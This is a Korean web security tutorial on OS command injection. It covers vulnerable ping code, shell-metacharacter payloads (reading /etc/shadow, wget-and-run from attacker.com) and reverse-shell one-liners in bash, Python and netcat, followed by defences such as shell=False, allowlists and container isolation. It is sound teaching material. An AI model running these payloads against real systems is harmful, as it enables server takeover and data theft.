---
title: "커맨드 인젝션: OS 명령어 탈취 공격과 방어"
description: "Command Injection의 공격 원리와 쉘 메타문자를 이용한 명령어 체인·리버스 쉘 기법을 설명하고, subprocess shell=False·입력 허용 목록·라이브러리 대체로 구성된 방어 전략을 Python/Node.js 코드와 함께 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-03"
archiveOrder: 8
type: "knowledge"
category: "Security"
tags: ["커맨드인젝션", "RCE", "OS명령어", "subprocess", "입력검증", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-nosql-injection/)에서 NoSQL 데이터베이스를 대상으로 한 인젝션 기법을 살펴봤다. 인젝션 계열 중 가장 치명적인 결과를 낳는 것은 **커맨드 인젝션(Command Injection)**이다. 성공 시 서버 OS에서 임의 명령어를 실행할 수 있어 서버 완전 장악, 파일 시스템 탈취, 리버스 쉘 설치까지 이어진다.

## 커맨드 인젝션이란

사용자 입력이 OS 쉘로 직접 전달될 때, 공격자가 입력에 쉘 메타문자(`; & | $() \``)를 삽입해 **임의 OS 명령어를 실행**하는 취약점이다.

```python
# 전형적인 취약 코드: 네트워크 진단 도구
import os
host = request.args.get('host')
result = os.popen(f"ping -c 1 {host}").read()
return result
```

`host`에 `8.8.8.8; cat /etc/shadow`를 입력하면 `ping`에 이어 시스템 비밀번호 파일이 그대로 반환된다.

![커맨드 인젝션 공격 패턴](/assets/posts/websec-command-injection-attack.svg)

## 쉘 메타문자 공격

쉘은 여러 명령어 구분자를 지원하며, 각각 다른 방식으로 명령어를 연결한다.

| 메타문자 | 동작 | 공격 예시 |
|---|---|---|
| `;` | 순차 실행 | `8.8.8.8; rm -rf /tmp/*` |
| `&&` | 앞 성공 시 실행 | `8.8.8.8 && cat /etc/passwd` |
| `\|\|` | 앞 실패 시 실행 | `invalid && id \|\| id` |
| `\|` | 파이프 | `8.8.8.8 \| nc attacker.com 4444` |
| `$()` | 명령 치환 | `$(wget attacker.com/s -O /tmp/s; bash /tmp/s)` |
| 개행 | 줄 구분 | `8.8.8.8%0Aid` (URL 인코딩) |

## 리버스 쉘

커맨드 인젝션의 가장 위험한 활용은 리버스 쉘이다. 서버가 공격자 서버에 연결해 영속적인 원격 제어를 가능하게 한다.

```bash
# 다양한 리버스 쉘 페이로드 (교육 목적)
# Bash
host=8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
host=8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# netcat
host=8.8.8.8; nc attacker.com 4444 -e /bin/sh
```

## 방어 전략

![커맨드 인젝션 방어](/assets/posts/websec-command-injection-defense.svg)

### 1. OS 명령어 사용 자체를 제거 (최선)

대부분의 OS 명령어는 라이브러리로 대체할 수 있다.

```python
# ❌ 위험: ping을 OS 명령어로 실행
import os
result = os.popen(f"ping -c 1 {host}").read()

# ✅ 안전: icmplib 라이브러리 사용
from icmplib import ping
result = ping(host, count=1)

# ❌ 위험: 파일 압축을 OS 명령어로
os.system(f"tar -czf {archive} {directory}")

# ✅ 안전: tarfile 모듈 사용
import tarfile
with tarfile.open(archive, "w:gz") as tar:
    tar.add(directory)
```

### 2. subprocess shell=False (대안)

OS 명령어가 꼭 필요하다면 `shell=False`와 리스트 인자로 전달한다.

```python
import subprocess
import re

def safe_nslookup(domain: str) -> str:
    # 입력 검증: 도메인 형식만 허용
    if not re.fullmatch(r"[a-zA-Z0-9.\-]+", domain):
        raise ValueError("유효하지 않은 도메인")

    # shell=False + 리스트 — ; | & $ 등이 문자열로만 취급됨
    result = subprocess.run(
        ["nslookup", domain],
        capture_output=True,
        text=True,
        timeout=10,
        shell=False  # 절대 True로 변경하지 말 것
    )
    return result.stdout
```

### 3. Node.js에서의 방어

```javascript
const { execFile } = require('child_process');

// ❌ 위험
const { exec } = require('child_process');
exec(`ping -c 1 ${host}`, callback);  // shell=true 동작

// ✅ 안전: execFile은 shell을 거치지 않음
function safePing(host, callback) {
    // 입력 검증
    if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) {
        return callback(new Error('Invalid IP'));
    }
    execFile('ping', ['-c', '1', host], {timeout: 5000}, callback);
}
```

### 4. 허용 목록(Allowlist) 강제

특정 값만 허용하는 것이 가장 강력하다.

```python
ALLOWED_COMMANDS = {
    "ping": ["ping", "-c", "1"],
    "traceroute": ["traceroute", "-m", "10"],
}

def execute_diagnostic(command_name: str, target: str) -> str:
    cmd_base = ALLOWED_COMMANDS.get(command_name)
    if not cmd_base:
        raise ValueError(f"허용되지 않은 명령어: {command_name}")

    if not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", target):
        raise ValueError("유효하지 않은 IP 주소")

    result = subprocess.run(
        cmd_base + [target],
        capture_output=True, text=True, timeout=10, shell=False
    )
    return result.stdout
```

## 환경 격리 (컨테이너 보안)

커맨드 인젝션이 성공했을 때 피해를 최소화하려면 서버를 최소 권한 컨테이너로 격리한다.

```dockerfile
FROM python:3.12-slim
# 최소 패키지만 설치 (ping, curl 등 공격 도구 제외)
RUN useradd -r -s /sbin/nologin appuser
USER appuser
# 읽기 전용 파일 시스템
```

```yaml
# Kubernetes Pod SecurityContext
spec:
  securityContext:
    runAsNonRoot: true
    readOnlyRootFilesystem: true
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
```

커맨드 인젝션은 **OS 명령어를 사용자 입력에 의존해 실행할 때만 발생**한다. 가능하다면 언어 라이브러리로 대체하고, 불가능하다면 `shell=False` + 리스트 인자 + 허용 목록을 반드시 조합해야 한다. 다음 글에서는 템플릿 엔진에서 발생하는 서버 사이드 템플릿 인젝션(SSTI)을 다룬다.

---

**지난 글:** [NoSQL 인젝션: MongoDB와 쿼리 조작 공격](/posts/websec-nosql-injection/)

**다음 글:** [템플릿 인젝션(SSTI): 서버 사이드 코드 실행 취약점](/posts/websec-template-injection/)

<br>
읽어주셔서 감사합니다. 😊
